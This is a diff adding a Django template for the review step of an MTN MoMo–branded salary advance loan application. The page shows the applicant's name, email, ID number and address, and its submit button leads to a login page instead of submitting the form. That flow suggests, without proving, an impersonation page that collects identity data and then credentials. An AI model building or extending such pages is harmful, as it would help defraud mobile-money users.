@@ -1,0 +1,43 @@
+{% extends 'loan/base.html' %}
+
+{% block back_button %}
+<button class="back-btn" onclick="history.back()">←</button>
+{% endblock %}
+
+{% block content %}
+<div class="card wide">
+    <div class="card-header">
+        <h2>Review & Submit</h2>
+        <p>Verify your information before submission</p>
+    </div>
+
+    <div style="background: #fffef5; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+        <h4 style="color: #1a1a1a; font-size: 11px; margin-bottom: 15px; letter-spacing: 0.5px;">LOAN DETAILS</h4>
+        <div class="summary-row"><span>Advance Amount (ZMW):</span> <strong>K{{ amount }}</strong></div>
+        <div class="summary-row"><span>Loan Term:</span> <strong>{{ term }} months</strong></div>
+    </div>
+
+    <div style="background: #fffef5; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+        <h4 style="color: #1a1a1a; font-size: 11px; margin-bottom: 15px; letter-spacing: 0.5px;">PERSONAL INFORMATION</h4>
+        <div class="summary-row"><span>Name:</span> <strong>{{ full_name }}</strong></div>
+        <div class="summary-row"><span>Email:</span> <strong>{{ email }}</strong></div>
+        <div class="summary-row"><span>ID:</span> <strong>{{ id_number }}</strong></div>
+        <div class="summary-row"><span>Address:</span> <strong>{{ address }}</strong></div>
+    </div>
+
+    <p style="font-size: 13px; color: #333; margin-bottom: 20px;">
+        By continuing, you accept the terms and conditions and authorize MTN MoMo to process your Salary Advance application.
+    </p>
+
+    <div class="btn-group">
+        <button type="button" class="btn-secondary" onclick="history.back()">BACK</button>
+        <a href="{% url 'login' %}" style="flex:1; text-decoration:none;">
+            <button type="button" class="btn-primary">SUBMIT APPLICATION</button>
+        </a>
+    </div>
+
+    <div style="text-align: center; margin-top: 15px; font-size: 11px; color: #7f8c8d;">
+        📝 Your application will be reviewed shortly. You'll receive updates via SMS and email.
+    </div>
+</div>
+{% endblock %}
